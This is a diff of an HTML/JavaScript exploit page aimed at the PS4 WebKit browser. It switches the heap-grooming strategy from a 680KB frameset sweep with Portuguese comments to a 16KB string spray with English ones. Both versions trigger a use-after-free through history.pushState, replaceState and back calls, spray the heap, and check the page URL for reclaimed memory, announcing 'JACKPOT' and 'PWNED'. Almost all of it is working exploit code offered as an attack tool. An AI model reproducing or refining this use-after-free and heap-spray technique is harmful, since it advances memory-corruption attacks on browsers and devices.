@@ -2,25 +2,24 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit - 680KB UTF-16 Sweep</title>
+<title>PS4 WebKit - Small Heap Fragmentation</title>
 <style>
-    body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
+    body { background-color: #000; color: #ff0000; font-family: monospace; padding: 20px; }
     button { 
         padding: 20px; width: 100%; margin-bottom: 10px;
         font-weight: bold; font-size: 16px; cursor: pointer; 
-        border: 2px solid #f0f; background: #202; color: #fff;
+        border: 2px solid #f00; background: #200; color: #fff;
         text-transform: uppercase;
     }
-    button:hover { background: #f0f; color: #000; }
     #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
-    .success { color: #fff; background-color: #aa00aa; padding: 5px; font-weight: bold; font-size: 1.2em;}
+    .success { color: #fff; background-color: #aa0000; padding: 5px; font-weight: bold; font-size: 1.2em;}
 </style>
 </head>
 <body>
-<h2>PS4 WebKit - 680KB Sweep (Targeting UTF-16)</h2>
-<div id="status">Pronto para o ataque dobrado...</div>
+<h2>PS4 WebKit - Small Heap Strategy (16KB)</h2>
+<div id="status">Ready to fragment...</div>
 
-<button onclick="runDoubleSweep()">INICIAR VARREDURA 85K (UTF-16)</button>
+<button onclick="runSmallReclaim()">START SMALL HEAP ATTACK</button>
 
 <div id="log"></div>
 
@@ -38,97 +37,76 @@ function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 var keepAlive = [];
 
-async function runDoubleSweep() {
+async function runSmallReclaim() {
     logEl.innerHTML = "";
     keepAlive = []; 
-    statusEl.innerText = "Rodando...";
+    statusEl.innerText = "Running...";
 
-    // === FASE 1: TRIGGER UAF ===
-    log("1. Disparando UAF (Criando buraco de ~680KB)...");
+    // === PHASE 1: TRIGGER UAF (MODIFIED FOR SMALL SIZE) ===
+    log("1. Triggering UAF (Targeting ~16KB)...");
     
-    let size = 977;
-    const STEP = 14461;
+    // We drastically reduce the size to ensure it stays in Small/Medium Heap
+    let size = 100;
+    const STEP = 500; // Small increments
+    const TARGET_SIZE_CHARS = 8000; // ~16KB in UTF-16
 
     for(let i = 0; i < 48; i++) {
         let frag = "V".repeat(size); 
         history.pushState({}, "", "#" + frag);
-        // O slice divide por 2, mas o WebKit multiplica por 2 (UTF-16).
-        // Resultado líquido: O tamanho na memória é igual ao tamanho original da string 'frag'.
         history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
         
         if(i % 6 === 0) setTimeout(() => history.back(), 0);
-        size += STEP;
-        await sleep(2); 
+        
+        if(size < TARGET_SIZE_CHARS) size += STEP;
+        await sleep(5); 
     }
     
-    await sleep(50); // Pausa essencial
+    await sleep(50);
 
-    // === FASE 2: FRAMESET SWEEP (DOBRADO) ===
-    // Alvo calculado: 85.089 vírgulas.
-    // Vamos varrer de 84.000 até 86.000.
+    // === PHASE 2: SPRAY SMALL STRINGS ===
+    // Target: 8000 chars * 2 bytes = 16000 bytes (~16KB)
+    // 16KB is a very standard size for bmalloc buckets.
     
-    const START = 84000;
-    const END = 86000;
-    const STEP_SIZE = 16; 
+    const SPRAY_LEN = 8000;
+    const SPRAY_COUNT = 10000; // Massive spray to fill all holes
     
-    statusEl.innerText = `2. Varrendo: ${START} - ${END} vírgulas...`;
-    log(`Iniciando varredura pesada (High Memory)...`);
-    log(`Alvo central: ~85.000 vírgulas`);
+    statusEl.innerText = `2. Spraying ${SPRAY_COUNT} small strings...`;
+    log(`Flooding heap with 16KB strings...`);
 
-    let current = START;
-    let batch = 0;
-
-    while(current < END) {
-        try {
-            let payload = ",".repeat(current);
-            let f = document.createElement("frameset");
-            f.rows = payload;
-            keepAlive.push(f);
-        } catch(e) {
-            log("Erro de memória: " + e.message);
-        }
+    for(let i=0; i < SPRAY_COUNT; i++) {
+        // Create unique strings to force allocation
+        let prefix = i.toString() + "_";
+        let payload = "W".repeat(SPRAY_LEN - prefix.length);
+        keepAlive.push(prefix + payload);
         
-        current += STEP_SIZE;
-        batch++;
-        
-        if(batch % 100 === 0) {
-            statusEl.innerText = `Spraying... (${current} / ${END})`;
-            await sleep(15); 
-        }
+        if(i % 1000 === 0) await sleep(10);
     }
 
-    log(`Spray Completo! ${keepAlive.length} objetos gigantes criados.`);
-    log("Aguardando estabilização...");
+    log(`Spray Complete! Heap saturated.`);
     await sleep(200);
 
-    // === FASE 3: VERIFICAÇÃO ===
-    statusEl.innerText = "3. Verificando...";
+    // === PHASE 3: VERIFY ===
+    statusEl.innerText = "3. Checking...";
     let url = document.URL;
     let changed = false;
     let sample = "";
     
-    // Procura por qualquer alteração no padrão 'V'
-    // Aumentei o range de busca para garantir
-    for(let i=1000; i<5000; i++) {
-        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
-            changed = true;
-            for(let k=0; k<16; k++) {
-                let code = url.charCodeAt(i+k);
-                sample += code.toString(16).padStart(2,'0') + " ";
-            }
-            break;
-        }
+    // Since the size is small, the 'V's might be fewer, but if reclaim happens, 'W' will be there.
+    if(url.includes("W")) {
+        changed = true;
+        sample = "Detected 'W' pattern!";
     }
 
     if(changed) {
         log("!!! JACKPOT !!!", "success");
-        log("A memória foi reclamada no modo UTF-16!");
-        log("Dados encontrados: " + sample);
-        statusEl.innerText = "PWNED: 680KB RECLAIMED";
-        statusEl.style.backgroundColor = "#aa00aa";
+        log("Small Heap Reclaim Successful!");
+        log(sample);
+        statusEl.innerText = "PWNED: SMALL HEAP";
+        statusEl.style.backgroundColor = "#ff0000";
     } else {
-        log("Falha: Ainda vendo apenas 'V'.");
-        log("Se falhar agora, o problema não é tamanho, é TIMING (Race Condition).");
+        log("Fail: Still seeing 'V'.");
+        log("Current URL Length: " + url.length);
+        log("If length is small (<1000), the UAF might not have triggered properly.");
     }
 }
 </script>
